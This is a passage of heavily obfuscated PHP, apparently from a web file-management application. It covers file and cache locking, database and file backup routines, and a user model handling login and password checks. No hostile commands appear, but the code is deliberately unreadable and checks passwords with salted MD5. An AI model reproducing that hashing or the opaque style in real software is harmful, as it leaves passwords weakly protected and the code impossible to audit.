self::init()->unlock($Û“­ºŒú); if (GLOBAL_DEBUG_LOG_ALL) { write_log($•¦³÷šè[862] . $èÃó¿¦, $•¦³÷šè[850]); } return; } public static function unlockRuntime() { $¿Š¤ŸÊÁ =& $_SERVER[å¸¿•¶£]; $êğ×šø = self::init(); $ÌøÂ¹é = !1; foreach (self::$lockItem as $Ùá¢×Æõ => $óŒ‡­Å) { if (!$óŒ‡­Å) { continue; } $êğ×šø->unlock($Ùá¢×Æõ); if (!$ÌøÂ¹é) { $ÌøÂ¹é = !0; write_log($¿Š¤ŸÊÁ[863] . $Ùá¢×Æõ . $¿Š¤ŸÊÁ[71] . get_caller_msg(), $¿Š¤ŸÊÁ[850]); continue; } write_log($¿Š¤ŸÊÁ[863] . $Ùá¢×Æõ, $¿Š¤ŸÊÁ[850]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ŠöÂ­¦¥ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¿Š¤ŸÊÁ[864] . $ŠöÂ­¦¥ . $¿Š¤ŸÊÁ[865] . ACTION, $¿Š¤ŸÊÁ[850]); } } public static function fileLock($±’¼¸…–) { $ƒÊ·¸ =& $_SERVER[å¸¿•¶£]; if (!$GLOBALS[$ƒÊ·¸[866]]) { $GLOBALS[$ƒÊ·¸[866]] = array(); } $GLOBALS[$ƒÊ·¸[866]][$±’¼¸…–] = !1; $èã”ÚÀ = fopen(DATA_PATH . $±’¼¸…– . $ƒÊ·¸[867], $ƒÊ·¸[868]); if (!$èã”ÚÀ) { return !1; } $GLOBALS[$ƒÊ·¸[866]][$±’¼¸…–] = $èã”ÚÀ; if (flock($èã”ÚÀ, LOCK_EX)) { return !0; } self::unlock($±’¼¸…–); show_json($ƒÊ·¸[869], !1); return !1; } public static function fileUnlock($úÚ•éÙâ) { $â—Î·ü• =& $_SERVER[å¸¿•¶£]; $ÊÓúˆ…— = $GLOBALS[$â—Î·ü•[866]][$úÚ•éÙâ]; if (!$ÊÓúˆ…—) { return; } $GLOBALS[$â—Î·ü•[866]][$úÚ•éÙâ] = !1; flock($ÊÓúˆ…—, LOCK_UN); fclose($ÊÓúˆ…—); } public static function fileUnlockAll() { $¿Ÿª†„ˆ =& $_SERVER[å¸¿•¶£]; if (!$GLOBALS[$¿Ÿª†„ˆ[866]]) { return; } foreach ($GLOBALS[$¿Ÿª†„ˆ[866]] as $Û±¯­›Ù => $¸ßº¼æİ) { if (!$¸ßº¼æİ) { continue; } $GLOBALS[$¿Ÿª†„ˆ[866]][$Û±¯­›Ù] = !1; flock($¸ßº¼æİ, LOCK_UN); fclose($¸ßº¼æİ); } $GLOBALS[$¿Ÿª†„ˆ[866]] = array(); } } goto BÖîˆ‘Ê…; cÆ“É‚±ËÒ: class CacheLockMemcached { public function lock($á«ä¶Â€, $ø€‹ÔÀ = 0) { $ì×¨ã¸‹ = Cache::init(); $æùŞ«§ = microtime(!0) + $ø€‹ÔÀ; while (microtime(!0) < $æùŞ«§) { $Æ¾¿­¬ = $ì×¨ã¸‹->get($á«ä¶Â€); if (!$Æ¾¿­¬ || $Æ¾¿­¬ < microtime(!0)) { $ßü†Ôú = $ì×¨ã¸‹->handle->add($á«ä¶Â€, $æùŞ«§, $ø€‹ÔÀ); if ($ßü†Ôú) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Å—‡¥¬) { return Cache::init()->get($Å—‡¥¬); } public function unlock($•¹¹øúğ) { return Cache::init()->remove($•¹¹øúğ); } } class CacheLockDatabase { public function lock($®åëÆÄˆ, $Õî½öÇ• = 0) { $Åûú»Ù€ = Model($_SERVER[å¸¿•¶£][836]); $ ïÉ³’Š = microtime(!0) + $Õî½öÇ•; while (microtime(!0) < $ ïÉ³’Š) { $­‚Ò²ôö = $Åûú»Ù€->get($®åëÆÄˆ); if (!$­‚Ò²ôö || $­‚Ò²ôö < microtime(!0)) { $Ö ÑÁÎ½ = $Åûú»Ù€->set($®åëÆÄˆ, $ ïÉ³’Š); if ($Ö ÑÁÎ½) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ş‘ÌÍ) { return Model($_SERVER[å¸¿•¶£][836])->get($Ş‘ÌÍ); } public function unlock($Ì®ƒ¤©´) { Model($_SERVER[å¸¿•¶£][836])->remove($Ì®ƒ¤©´); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¬¾®ï·¢, $¾Øû¡öà) { $ÉØŸî…½ =& $_SERVER[å¸¿•¶£]; if (!class_exists($ÉØŸî…½[874])) { show_json($ÉØŸî…½[875], !1); } $this->cacheTime = $¾Øû¡öà; $this->handle = new Memcached(); if (is_array($¬¾®ï·¢[$ÉØŸî…½[876]]) && count($¬¾®ï·¢[$ÉØŸî…½[876]]) >= 1) { foreach ($¬¾®ï·¢[$ÉØŸî…½[876]] as $çûó€Ë•) { $ÊŸ£Îáõ = explode($ÉØŸî…½[4], $çûó€Ë•); $this->handle->addServer($ÊŸ£Îáõ[0], $ÊŸ£Îáõ[1]); } } else { $this->handle->addServer($¬¾®ï·¢[$ÉØŸî…½[182]], $¬¾®ï·¢[$ÉØŸî…½[183]]); } } public function set($®Ú¹‚ëÉ, $ÄîÅø­ê, $¹¤ã–õÅ = false) { $¹¤ã–õÅ = $¹¤ã–õÅ ? $¹¤ã–õÅ : $this->cacheTime; return $this->handle->set($®Ú¹‚ëÉ, $ÄîÅø­ê, $¹¤ã–õÅ); } public function get($„íÂ®Íñ) { return $this->handle->get($„íÂ®Íñ); } public function remove($œğ·ä•¡) { return $this->handle->delete($œğ·ä•¡); } public function deleteAll() { return $this->handle->flush(); } } goto DÌ§à¼…¿Û; cÃÄ Ö´µË: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $şû»ÕİÂ =& $_SERVER[å¸¿•¶£]; $¥—¤í«â = Backup::get(); self::$io = $¥—¤í«â[$şû»ÕİÂ[758]]; self::$name = $¥—¤í«â[$şû»ÕİÂ[32]]; $Ş¨Ş¨ò = new DbManage(); $‹ÄÙƒá = $Ş¨Ş¨ò->dbType(); $‡…‚õÉ = array($şû»ÕİÂ[783] => $‹ÄÙƒá, $şû»ÕİÂ[784] => time()); Backup::set($‡…‚õÉ); $ò²ƒÇÏŸ = $this->tmpFilesPath() . $şû»ÕİÂ[785] . self::$name . $şû»ÕİÂ[8]; del_dir($ò²ƒÇÏŸ); mk_dir($ò²ƒÇÏŸ); $È™å€¸Õ = $›Éå¦í£ = 0; $½¸Ëü‘® = new Task($şû»ÕİÂ[786], $şû»ÕİÂ[787], 0, LNG($şû»ÕİÂ[788]) . $şû»ÕİÂ[789] . LNG($şû»ÕİÂ[790])); try { $ÈÅßú£« = $Ş¨Ş¨ò->db()->getTables(); } catch (Exception $‰¥áÏÎò) { $½¸Ëü‘®->end(); return !1; } $ÈÅßú£« = array_diff($ÈÅßú£«, array($şû»ÕİÂ[791], $şû»ÕİÂ[792])); foreach ($ÈÅßú£« as $ÉŸÒİŠÉ) { $È™å€¸Õ += $Ş¨Ş¨ò->model($ÉŸÒİŠÉ)->count(); } $½¸Ëü‘®->task[$şû»ÕİÂ[793]] = $È™å€¸Õ; $GLOBALS[$şû»ÕİÂ[794]] = self::$name; foreach ($ÈÅßú£« as $ÉŸÒİŠÉ) { $¬Üª«¤é = $ò²ƒÇÏŸ . $ÉŸÒİŠÉ . $şû»ÕİÂ[795]; $§¹·••… = null; if ($ÉŸÒİŠÉ == $şû»ÕİÂ[796] && (!isset($¥—¤í«â[$şû»ÕİÂ[761]]) || $¥—¤í«â[$şû»ÕİÂ[761]] == $şû»ÕİÂ[198])) { $§¹·••… = self::$io; } $›Éå¦í£ += $Ş¨Ş¨ò->sqlFromDb($ÉŸÒİŠÉ, $¬Üª«¤é, $½¸Ëü‘®, $§¹·••…); } unset($GLOBALS[$şû»ÕİÂ[794]]); $½¸Ëü‘®->end(); if ($›Éå¦í£ > $È™å€¸Õ) { $È™å€¸Õ = $›Éå¦í£; } $‡…‚õÉ = array($şû»ÕİÂ[783] => $‹ÄÙƒá, $şû»ÕİÂ[780] => 1, $şû»ÕİÂ[797] => $È™å€¸Õ, $şû»ÕİÂ[798] => $›Éå¦í£, $şû»ÕİÂ[799] => time()); Backup::set($‡…‚õÉ); if ($È™å€¸Õ - $›Éå¦í£ > 0) { $øÀ™É‘ = $şû»ÕİÂ[800]; if (stristr(I18n::getType(), $şû»ÕİÂ[801])) { $øÀ™É‘ = $şû»ÕİÂ[802]; } write_log(array($øÀ™É‘, $‡…‚õÉ), $şû»ÕİÂ[787]); return !1; } return !0; } private function tmpFilesPath() { $şÌ¼ğß =& $_SERVER[å¸¿•¶£]; $®¤Î´±Ğ = TEMP_FILES; if ($GLOBALS[$şÌ¼ğß[6]][$şÌ¼ğß[89]][$şÌ¼ğß[803]]) { $®¤Î´±Ğ = $GLOBALS[$şÌ¼ğß[6]][$şÌ¼ğß[89]][$şÌ¼ğß[803]]; if (!mk_dir($®¤Î´±Ğ) || !is_writable($®¤Î´±Ğ) || !IO::mkfile($®¤Î´±Ğ . $şÌ¼ğß[804])) { $®¤Î´±Ğ = TEMP_FILES; } } return $®¤Î´±Ğ; } } class BackupDbFile { public function __construct() { } public function index() { $ï÷úÆğ =& $_SERVER[å¸¿•¶£]; $˜«¾Çùà = Backup::get(); $ÌĞÌè©ô = $˜«¾Çùà[$ï÷úÆğ[32]]; $şï˜­á© = $this->tmpFilesPath() . "\142\x61\143\153\165\160\x5f{$ÌĞÌè©ô}\x2f"; $ö…¡éŸ† = $this->backupPath($˜«¾Çùà); if (!($ö…¡éŸ† = IO::mkdir($ö…¡éŸ†))) { return !1; } $ñŸÙ¶×µ = IO::listPath($şï˜­á©); $¬Ğ‡²Íõ = isset($ñŸÙ¶×µ[$ï÷úÆğ[83]]) ? $ñŸÙ¶×µ[$ï÷úÆğ[83]] : array(); $Š˜€Ãóç = array_sum(array_column($¬Ğ‡²Íõ, $ï÷úÆğ[76])); if (!$Š˜€Ãóç) { return !1; } $¦Æå¥ˆ± = array($ï÷úÆğ[805] => $Š˜€Ãóç, $ï÷úÆğ[806] => time()); Backup::set($¦Æå¥ˆ±); $ÓÒúÁü  = new TaskFileTransfer($ï÷úÆğ[807], $ï÷úÆğ[787], count($¬Ğ‡²Íõ), LNG($ï÷úÆğ[788]) . $ï÷úÆğ[386] . LNG($ï÷úÆğ[790]) . $ï÷úÆğ[808]); $ÓÒúÁü ->task[$ï÷úÆğ[770]] = $Š˜€Ãóç; foreach ($ñŸÙ¶×µ[$ï÷úÆğ[83]] as $ò—¿Ë˜÷) { $»ä·ëç‡ = IO::move($ò—¿Ë˜÷[$ï÷úÆğ[84]], $ö…¡éŸ†); if (!$»ä·ëç‡) { $ÓÒúÁü ->end(); $¯³Ì‰èş = IO::getLastError($ï÷úÆğ[809] . $ò—¿Ë˜÷[$ï÷úÆğ[84]] . $ï÷úÆğ[810] . $ö…¡éŸ† . $ï÷úÆğ[164]); write_log($¯³Ì‰èş, $ï÷úÆğ[787]); return !1; } } $ıØßÍ× = new DbManage(); $°ñ÷‘ò = $ıØßÍ×->getSqlFile(); if (!$°ñ÷‘ò[$ï÷úÆğ[811]] || !$°ñ÷‘ò[$ï÷úÆğ[13]]) { return !1; } IO::move($°ñ÷‘ò[$ï÷úÆğ[811]], $ö…¡éŸ†); IO::move($°ñ÷‘ò[$ï÷úÆğ[13]], $ö…¡éŸ†); $ÓÒúÁü ->end(); $¦Æå¥ˆ± = array($ï÷úÆğ[812] => $Š˜€Ãóç, $ï÷úÆğ[813] => time()); Backup::set($¦Æå¥ˆ±); return !0; } private function backupPath($Õ£Ñô…¥) { $Í¹Ã¬…Ë =& $_SERVER[å¸¿•¶£]; $¯áÈŒË = $Õ£Ñô…¥[$Í¹Ã¬…Ë[32]]; $àÈí‰Å˜ = Model($Í¹Ã¬…Ë[777])->get($Í¹Ã¬…Ë[778]); $ÀóĞÉ‚ñ = substr(md5($Í¹Ã¬…Ë[779] . $àÈí‰Å˜ . $¯áÈŒË), 0, 8); return "\173\x69\x6f\x3a{$Õ£Ñô…¥[$Í¹Ã¬…Ë[758]]}\175\57\x64\141\x74\x61\142\141\x73\x65\57\142\x61\x63\153\165\160\x2f" . $¯áÈŒË . $Í¹Ã¬…Ë[11] . $ÀóĞÉ‚ñ; } private function tmpFilesPath() { $µıŞÒù¯ =& $_SERVER[å¸¿•¶£]; $…ËÜä—µ = TEMP_FILES; if ($GLOBALS[$µıŞÒù¯[6]][$µıŞÒù¯[89]][$µıŞÒù¯[803]]) { $…ËÜä—µ = $GLOBALS[$µıŞÒù¯[6]][$µıŞÒù¯[89]][$µıŞÒù¯[803]]; if (!mk_dir($…ËÜä—µ) || !is_writable($…ËÜä—µ) || !IO::mkfile($…ËÜä—µ . $µıŞÒù¯[804])) { $…ËÜä—µ = TEMP_FILES; } } return $…ËÜä—µ; } } class BackupFile { public function __construct() { } public function index() { $ó©ú¡Œ  = Backup::get(); $Á¦éâĞò = $ó©ú¡Œ [$_SERVER[å¸¿•¶£][293]][$_SERVER[å¸¿•¶£][200]][$_SERVER[å¸¿•¶£][468]]; $Ó¯Ë¶Ûæ = array($_SERVER[å¸¿•¶£][469] => array($_SERVER[å¸¿•¶£][814], $Á¦éâĞò), $_SERVER[å¸¿•¶£][815] => array($_SERVER[å¸¿•¶£][331], $ó©ú¡Œ [$_SERVER[å¸¿•¶£][758]])); $ÒÑÇÓıû = (int) Model($_SERVER[å¸¿•¶£][796])->where($Ó¯Ë¶Ûæ)->count($_SERVER[å¸¿•¶£][468]); $»Ù¬öÚ = (int) Model($_SERVER[å¸¿•¶£][796])->where($Ó¯Ë¶Ûæ)->sum($_SERVER[å¸¿•¶£][76]); $Š¢öÓå = new TaskFileTransfer($_SERVER[å¸¿•¶£][816], $_SERVER[å¸¿•¶£][787], $ÒÑÇÓıû, LNG($_SERVER[å¸¿•¶£][788]) . $_SERVER[å¸¿•¶£][789] . LNG($_SERVER[å¸¿•¶£][817])); $Š¢öÓå->task[$_SERVER[å¸¿•¶£][770]] = $»Ù¬öÚ; $âûÈ˜éÚ = array($_SERVER[å¸¿•¶£][818] => $ÒÑÇÓıû, $_SERVER[å¸¿•¶£][819] => $»Ù¬öÚ, $_SERVER[å¸¿•¶£][820] => time()); Backup::set($âûÈ˜éÚ); $íºğÈ”€ = !0; $¾çÑ„ûä = $this->storeIds(); $ó®ÏàüÁ = 1; $å²ËÂ±¯ = 1000; $½ ¤èÙÈ = $ÎüïÛ°Í = 0; $¾ò·Ä†ˆ = array(); $¤¾¬¬„† = $ñ¹„á¼ = 0; do { $­Ù‡èú = $_SERVER[å¸¿•¶£][821]; $şôøß³¡ = Model($_SERVER[å¸¿•¶£][796])->where($Ó¯Ë¶Ûæ)->field($­Ù‡èú)->order($_SERVER[å¸¿•¶£][822])->selectPage($å²ËÂ±¯, $ó®ÏàüÁ); $ıÓ¢İïî = !empty($şôøß³¡[$_SERVER[å¸¿•¶£][369]]) ? $şôøß³¡[$_SERVER[å¸¿•¶£][369]] : array(); foreach ($ıÓ¢İïî as $¡Å¡Í¶ü) { if (!$this->_fileExist($¡Å¡Í¶ü, $¾ò·Ä†ˆ, $¾çÑ„ûä)) { $ÒÑÇÓıû -= 1; $»Ù¬öÚ -= (int) $¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][76]]; write_log("\146\x69\x6c\145\x20\156\x6f\164\x20\x65\170\151\163\x74\56\x66\x69\x6c\145\111\104\x3a{$¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][468]]}\54\40\160\x61\x74\x68\72{$¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][84]]}", $_SERVER[å¸¿•¶£][823]); continue; } $Æ¸¥©şÔ = $¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][84]]; $¬ï·Éµô = "\173\x69\x6f\72{$ó©ú¡Œ [$_SERVER[å¸¿•¶£][758]]}\175" . substr($Æ¸¥©şÔ, strlen("\173\x69\157\72{$¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][824]]}\175")); if (IO::exist($¬ï·Éµô)) { $Š¢öÓå->updateFileEnd($¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][32]], $¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][76]]); } else { $¬ï·Éµô = get_path_father($¬ï·Éµô); IO::mkdir($¬ï·Éµô); if (!IO::copy($Æ¸¥©şÔ, $¬ï·Éµô, $_SERVER[å¸¿•¶£][825])) { write_log($_SERVER[å¸¿•¶£][826] . $Æ¸¥©şÔ . $_SERVER[å¸¿•¶£][810] . $¬ï·Éµô . $_SERVER[å¸¿•¶£][164], $_SERVER[å¸¿•¶£][787]); $íºğÈ”€ = !1; break; } } $Á¦éâĞò = $¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][468]]; $ÎüïÛ°Í += 1; $½ ¤èÙÈ += $¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][76]]; $ñ¹„á¼ += 1; $¤¾¬¬„† += $¡Å¡Í¶ü[$_SERVER[å¸¿•¶£][76]]; if ($½ ¤èÙÈ >= 1024 * 1024 * 100) { $âûÈ˜éÚ = array($_SERVER[å¸¿•¶£][827] => $Á¦éâĞò, $_SERVER[å¸¿•¶£][828] => $ñ¹„á¼, $_SERVER[å¸¿•¶£][829] => $¤¾¬¬„†); Backup::set($âûÈ˜éÚ); $½ ¤èÙÈ = $ÎüïÛ°Í = 0; } } $âúâÃÂÄ = count($ıÓ¢İïî); $ó®ÏàüÁ++; } while ($âúâÃÂÄ == $å²ËÂ±¯); $Š¢öÓå->end(); $âûÈ˜éÚ = array($_SERVER[å¸¿•¶£][830] => 1, $_SERVER[å¸¿•¶£][768] => time(), $_SERVER[å¸¿•¶£][782] => 1, $_SERVER[å¸¿•¶£][827] => $Á¦éâĞò, $_SERVER[å¸¿•¶£][819] => $»Ù¬öÚ, $_SERVER[å¸¿•¶£][818] => $ÒÑÇÓıû, $_SERVER[å¸¿•¶£][831] => time()); if ($ÎüïÛ°Í) { $âûÈ˜éÚ[$_SERVER[å¸¿•¶£][828]] = $ñ¹„á¼; $âûÈ˜éÚ[$_SERVER[å¸¿•¶£][829]] = $¤¾¬¬„†; } Backup::set($âûÈ˜éÚ); $this->_fileFilter($¾ò·Ä†ˆ); return !0; } private function _fileExist($÷¦É¶–“, &$ˆÁÛˆ·’, $¦¯üóØ‘) { $ãÃ˜ş =& $_SERVER[å¸¿•¶£]; $¨öë…ä¡ = $÷¦É¶–“[$ãÃ˜ş[84]]; if (in_array($÷¦É¶–“[$ãÃ˜ş[468]], $ˆÁÛˆ·’)) { return !1; } if (!in_array($÷¦É¶–“[$ãÃ˜ş[824]], $¦¯üóØ‘)) { return !1; } if (IO::exist($¨öë…ä¡)) { return !0; } $ÅİÂİ–¼ = get_path_father($¨öë…ä¡); if (IO::exist($ÅİÂİ–¼)) { $ˆÁÛˆ·’[] = $÷¦É¶–“[$ãÃ˜ş[468]]; return !1; } $èë¢Èò´ = array($ãÃ˜ş[824] => $÷¦É¶–“[$ãÃ˜ş[824]], $ãÃ˜ş[84] => array($ãÃ˜ş[383], "{$ÅİÂİ–¼}\45")); $Æ½¤Ü›É = Model($ãÃ˜ş[796])->where($èë¢Èò´)->field($ãÃ˜ş[469])->select(); $ˆÁÛˆ·’ = array_merge($ˆÁÛˆ·’, array_to_keyvalue($Æ½¤Ü›É, $ãÃ˜ş[12], $ãÃ˜ş[468])); return !1; } private function _fileFilter($ÃñÄÖÃ) { $ÛœÓäÍ =& $_SERVER[å¸¿•¶£]; if (empty($ÃñÄÖÃ)) { return; } $´ıÇ„±‡ = array($ÛœÓäÍ[468] => array($ÛœÓäÍ[7], array_unique($ÃñÄÖÃ))); $£à¹Ê¯‰ = Model($ÛœÓäÍ[832])->where($´ıÇ„±‡)->field($ÛœÓäÍ[402])->select(); foreach ($£à¹Ê¯‰ as $ÈÇ¢¨í) { Model($ÛœÓäÍ[832])->remove($ÈÇ¢¨í[$ÛœÓäÍ[402]], !1); } } private function storeIds() { $Ë”øÃş¯ =& $_SERVER[å¸¿•¶£]; $í¶üÑøŞ = Model($Ë”øÃş¯[774])->listData(); $ßôü“×Œ = array(); $Àğ¦Ó»ò = $GLOBALS[$Ë”øÃş¯[6]][$Ë”øÃş¯[89]][$Ë”øÃş¯[833]]; foreach ($í¶üÑøŞ as $¦¨œÎ†Œ) { $ŞáˆÇõ = strtolower($¦¨œÎ†Œ[$Ë”øÃş¯[95]]); if (!isset($Àğ¦Ó»ò[$ŞáˆÇõ])) { continue; } $ñ·åÊ = $Ë”øÃş¯[74] . (isset($Àğ¦Ó»ò[$ŞáˆÇõ]) ? $Àğ¦Ó»ò[$ŞáˆÇõ] : ucfirst($ŞáˆÇõ)); if (!class_exists($ñ·åÊ)) { continue; } $ßôü“×Œ[] = $¦¨œÎ†Œ[$Ë”øÃş¯[399]]; } return $ßôü“×Œ; } } goto cŞ³öÏ¤ó; E©’‡¤ö: class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\x61\142\154\145\116\141\155\x65" => "\x75\x73\145\x72\x5f\155\145\164\141", "\x6d\x65\x74\x61\106\151\145\x6c\x64" => "\x75\163\x65\x72\111\x44"); protected $simpleField = "\165\x73\145\162\111\x44\54\x6e\151\x63\x6b\116\141\155\x65\x2c\156\141\x6d\145\54\x61\166\141\164\141\x72\54\x73\145\x78\54\x73\164\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($•¿ßÁç) { $Øœ¥¹´ =& $_SERVER[å¸¿•¶£]; $œÉğúù× = $Øœ¥¹´[2310]; return array($Øœ¥¹´[1941] => array($•¿ßÁç[0], $œÉğúù×), $Øœ¥¹´[1943] => array($•¿ßÁç[0], $œÉğúù×), $Øœ¥¹´[2311] => array($•¿ßÁç[0], $œÉğúù×)); } protected function getInfo($ş¸åÀ¯–, $‰«Á­•ˆ = false) { $¡Ã’òæÇ = $this->getInfoSimple($ş¸åÀ¯–); if (!is_array($¡Ã’òæÇ)) { return array(); } if ($‰«Á­•ˆ) { return $this->_getInfoApply($¡Ã’òæÇ); } return $this->cacheFunctionGet($_SERVER[å¸¿•¶£][1945], $ş¸åÀ¯–); } protected function getInfoFull($Ğ‡ÔÛÖí, $ä¶ò˜÷ = false) { $Åïí¬¸Ã = $this->getInfoSimple($Ğ‡ÔÛÖí); if (!is_array($Åïí¬¸Ã)) { return array(); } if ($ä¶ò˜÷) { return $this->_getInfoApply($Åïí¬¸Ã, !0); } return $this->cacheFunctionGet($_SERVER[å¸¿•¶£][2312], $Ğ‡ÔÛÖí); } private function _getInfoApply($¦ƒ½ªñ„, $ùòµåš° = false) { $´õ–° =& $_SERVER[å¸¿•¶£]; if (!$¦ƒ½ªñ„) { return $¦ƒ½ªñ„; } $à—ğ÷šø = md5($´õ–°[2313] . $¦ƒ½ªñ„[$´õ–°[896]] . $´õ–°[2314] . $¦ƒ½ªñ„[$´õ–°[32]]); $¦ƒ½ªñ„ = $this->_listDataApplyItem($¦ƒ½ªñ„); $²óÙ·” = Model($´õ–°[1346])->metaGet($¦ƒ½ªñ„[$´õ–°[87]][$´õ–°[402]]); $¦ƒ½ªñ„[$´õ–°[2315]] = $à—ğ÷šø; $¦ƒ½ªñ„[$´õ–°[87]][$´õ–°[2136]] = isset($²óÙ·”[$´õ–°[2137]]) ? $²óÙ·”[$´õ–°[2137]] : null; if ($ùòµåš°) { $¦ƒ½ªñ„[$´õ–°[466]] = $this->metaGet($¦ƒ½ªñ„[$´õ–°[1674]]); } return $¦ƒ½ªñ„; } protected function getInfoSimple($„Ë‹ã, $ÛÖ—‡ß = false) { $÷«¹Ã =& $_SERVER[å¸¿•¶£]; if (!$„Ë‹ã) { return array(); } if ($ÛÖ—‡ß) { $õ­ªäé† = $this->where(array($÷«¹Ã[1674] => intval($„Ë‹ã)))->find(); if (!is_array($õ­ªäé†)) { return array(); } $õ­ªäé†[$÷«¹Ã[533]] = Action($÷«¹Ã[2316])->parseUrl($õ­ªäé†[$÷«¹Ã[533]]); return $õ­ªäé†; } return $this->cacheFunctionGet($÷«¹Ã[1946], $„Ë‹ã); } protected function getInfoSimpleOuter($À¦äğ¯æ) { $éæÀüÂ =& $_SERVER[å¸¿•¶£]; if (!$À¦äğ¯æ || $À¦äğ¯æ == 0) { return array($éæÀüÂ[1674] => $éæÀüÂ[198], $éæÀüÂ[32] => $éæÀüÂ[162] . LNG($éæÀüÂ[2317]) . $éæÀüÂ[164], $éæÀüÂ[533] => STATIC_PATH . $éæÀüÂ[2318]); } $ä”ÈÔĞ§ = $this->cacheFunctionGet($éæÀüÂ[1946], $À¦äğ¯æ); $Ïàè‰ó˜ = array_field_key($ä”ÈÔĞ§, explode($éæÀüÂ[50], $this->simpleField)); if (!$Ïàè‰ó˜) { return array($éæÀüÂ[1674] => $éæÀüÂ[1195], $éæÀüÂ[32] => $éæÀüÂ[162] . LNG($éæÀüÂ[2319]) . $éæÀüÂ[164], $éæÀüÂ[533] => STATIC_PATH . $éæÀüÂ[2320]); } $Ïàè‰ó˜[$éæÀüÂ[533]] = Action($éæÀüÂ[2316])->parseUrl($Ïàè‰ó˜[$éæÀüÂ[533]]); return $Ïàè‰ó˜; } protected function groupUser($æ¡ÀÚ…†) { } public static function errorLang($¨¯Ö›š) { $¨Ñëıõ£ =& $_SERVER[å¸¿•¶£]; $ã‹Ä„Óí = array(self::ERROR_USER_NOT_EXISTS => $¨Ñëıõ£[2321], self::ERROR_USER_PASSWORD_ERROR => $¨Ñëıõ£[2322], self::ERROR_USER_EXIST_NAME => $¨Ñëıõ£[2323], self::ERROR_USER_EXIST_PHONE => $¨Ñëıõ£[2324], self::ERROR_USER_EXIST_EMAIL => $¨Ñëıõ£[2325], self::ERROR_USER_LOGIN_LOCK => $¨Ñëıõ£[2326], self::ERROR_IP_NOT_ALLOW => $¨Ñëıõ£[2327], self::ERROR_USER_EXIST_NICKNAME => $¨Ñëıõ£[2328]); return LNG($ã‹Ä„Óí[$¨¯Ö›š]); } public function getInfoByMeta($òèÄ¸¨, $öÄüŞûç) { $ù¡×´¤™ =& $_SERVER[å¸¿•¶£]; $ëÁˆì‘ø = Model($ù¡×´¤™[2329])->where(array($ù¡×´¤™[94] => $òèÄ¸¨, $ù¡×´¤™[374] => $öÄüŞûç))->find(); if ($ëÁˆì‘ø) { return $this->getInfo($ëÁˆì‘ø[$ù¡×´¤™[1674]]); } return !1; } public function userLoginCheck($¡á›÷¨, $áËºª¾±) { $ëì×µ¹ =& $_SERVER[å¸¿•¶£]; $š†½¯Ï‚ = $this->userLoginFind($¡á›÷¨); if (!$š†½¯Ï‚) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($š†½¯Ï‚[$ëì×µ¹[1674]], $áËºª¾±)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($š†½¯Ï‚[$ëì×µ¹[1674]]); } public function userLoginFind($É´ÚŠ¼‰) { $´œãªØ =& $_SERVER[å¸¿•¶£]; $é‹†´¾Ö = array($´œãªØ[32] => $É´ÚŠ¼‰, $´œãªØ[532] => $É´ÚŠ¼‰, $´œãªØ[305] => $É´ÚŠ¼‰, $´œãªØ[2330] => $É´ÚŠ¼‰, $´œãªØ[1007] => $´œãªØ[1009]); if ($this->nickNameRpt()) { unset($é‹†´¾Ö[$´œãªØ[532]]); } return $this->where($é‹†´¾Ö)->find(); } public function clearCache($²ŞÚ‚ôË) { $¾æÚ­º =& $_SERVER[å¸¿•¶£]; $this->cacheFunctionClear($¾æÚ­º[1945], $²ŞÚ‚ôË); $this->cacheFunctionClear($¾æÚ­º[1946], $²ŞÚ‚ôË); $this->cacheFunctionClear($¾æÚ­º[2312], $²ŞÚ‚ôË); } public function userPasswordCheck($¥ƒ‘üØé, $åçä‹“) { $„²ƒ®ôá =& $_SERVER[å¸¿•¶£]; $°´ö¶å = $this->where(array($„²ƒ®ôá[1674] => intval($¥ƒ‘üØé)))->find(); $•ÖÕÃ = $this->metaGet($¥ƒ‘üØé); $ïŠ»şªÓ = isset($•ÖÕÃ[$„²ƒ®ôá[2331]]) ? $•ÖÕÃ[$„²ƒ®ôá[2331]] : $„²ƒ®ôá[12]; if (md5($ïŠ»şªÓ . trim($åçä‹“)) !== $°´ö¶å[$„²ƒ®ôá[896]]) { return !1; } return !0; } public function userAdd($·ÖÕíı·) { $îİ¥š€« =& $_SERVER[å¸¿•¶£]; $Ø¢ëªƒ = array($îİ¥š€«[420] => $·ÖÕíı·[$îİ¥š€«[32]], $îİ¥š€«[2332] => $·ÖÕíı·[$îİ¥š€«[1555]], $îİ¥š€«[2333] => isset($·ÖÕíı·[$îİ¥š€«[305]]) ? $·ÖÕíı·[$îİ¥š€«[305]] : $îİ¥š€«[12], $îİ¥š€«[2334] => isset($·ÖÕíı·[$îİ¥š€«[2330]]) ? $·ÖÕíı·[$îİ¥š€«[2330]] : $îİ¥š€«[12], $îİ¥š€«[2335] => isset($·ÖÕíı·[$îİ¥š€«[532]]) ? $·ÖÕíı·[$îİ¥š€«[532]] : $·ÖÕíı·[$îİ¥š€«[32]], $îİ¥š€«[2336] => isset($·ÖÕíı·[$îİ¥š€«[533]]) ? $·ÖÕíı·[$îİ¥š€«[533]] : $îİ¥š€«[12], $îİ¥š€«[2337] => isset($·ÖÕíı·[$îİ¥š€«[2338]]) ? 